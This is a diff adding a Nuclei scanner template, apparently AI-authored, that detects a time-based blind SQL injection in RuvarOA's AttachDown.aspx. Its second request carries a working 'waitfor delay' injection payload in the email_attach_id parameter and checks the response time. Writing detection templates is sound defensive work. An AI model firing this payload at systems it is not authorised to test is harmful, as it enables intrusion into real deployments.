@@ -1,0 +1,44 @@
+id: ruvaroa-attachdown-sqli
+info:
+  name: RuvarOA AttachDown SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL Injection vulnerability in RuvarOA AttachDown functionality.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /login.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "txt_admin_key"
+
+  - raw:
+      - |
+        GET /Mobile/LHMail/AttachDown.aspx?email_attach_id=1%27)+waitfor+delay+%270:0:{{t1}}%27+--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1) && duration < to_number(t2)"
